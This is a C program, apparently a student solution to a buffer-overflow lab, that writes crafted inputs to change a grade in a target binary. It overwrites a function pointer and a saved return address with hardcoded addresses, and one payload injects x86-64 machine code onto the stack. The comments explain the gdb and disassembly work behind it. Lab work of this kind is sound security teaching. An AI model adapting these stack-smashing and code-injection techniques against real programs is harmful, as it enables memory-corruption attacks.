#include <stdio.h>

int main(int argc,char *argv[]) {
		
	/**
	* (gdb) print (long)&buf - (long)&f
	* $1 = -72
	* (gdb) print setGradeToD
	* $2 = {void (void *)} 0x4007b8 <setGradeToD>
	* Thus, we are filling D[72...75] with address of setGradeToD
	* and the addres is stored in reversed order in array, from low address to high address....
	*/	
	char D[76] = "Frank";
	
	D[72] = 0xb8;
	D[73] = 0x07;
	D[74] = 0x40;
	D[75] = 0x00;
	
	/**
	* This is similar to D, we just simply leave E[72...75] as '\000',
	* so that &f = &checkName will be replaced with all 0s
	*/
	char E[76] = "Frank";
	
	/**
	* In disassemble main, we found:
	* 0x00000000004007fe <+114>:   callq  0x4006fe <readString> 
    * 0x0000000000400803 <+119>:   mov    $0x600dc0,%esi
	* ......
	* 0x000000000040081e <+146>:   movb   $0x43,0x20055f(%rip)        # 0x600d84 <grade>
	* that is to say, the return address of readString is "0x0000000000400803"
	* we try to change the return address to 0x000000000040081e, thus the grade can be changed into C.	
	*/
	char C[124] = "Frank";	
	
	//Restore the address of method checkName
	C[72] = 0x59;
	C[73] = 0x08;
	C[74] = 0x40;
	C[75] = 0x00;
	
	//change the return address
	C[120] = 0x1e;
	C[121] = 0x08;
	C[122] = 0x40;
	C[123] = 0x00;
	
	
	/**
	* The instructions we added after user name is:
	* 1. move 'B' value to the address where grade is stored
	* 2. jump and return to where readString() is called in main
	* the corresponding hex and assembly code is：
	* 
	* c6 04 25 84 0d 60 00 42	movb	$0x42, 0x600d84
	* 48 c7 c0 03 08 40 00		mov		$0x400803,%rax
	* ff e0						jmpq	*%rax
	*/	
	char B[124] = "Frank\0";
	
	//1. move 'B' value to the address where grade is stored
	B[6] = 0xc6;
	B[7] = 0x04;
	B[8] = 0x25;
	B[9] = 0x84;
	B[10] = 0x0d;
	B[11] = 0x60;
	B[12] = 0x00;
	B[13] = 0x42;
	
	//2. jump and return to where readString() is called in main
	B[14] = 0x48;
	B[15] = 0xc7;
	B[16] = 0xc0;
	B[17] = 0x03;
	B[18] = 0x08;
	B[19] = 0x40;
	B[20] = 0x00;
	B[21] = 0xff;
	B[22] = 0xe0;
	
	//Restore the address of method checkName
	B[72] = 0x59;
	B[73] = 0x08;
	B[74] = 0x40;
	B[75] = 0x00;
	
	//write the return address to buffer which contains above assembly code.
	//jump to code at the beginning of the array
	B[120] = 0xc6;
	B[121] = 0x0d;
	B[122] = 0x60;
	B[123] = 0x00;

	if (argc != 2)
    {
        printf("usage ./trigger lower_case_letter\n");
        return 1;
    }

	switch(argv[1][0]) {
		case 'd':
			write(1,D,76);
			break;
		case 'e':
			write(1,E,76);
			break;
		case 'c':
			write(1, C, 124);
			break;
		case 'b':
			write(1, B, 124);
			break;
		default:
			break;
	}
	
	return 0;
}
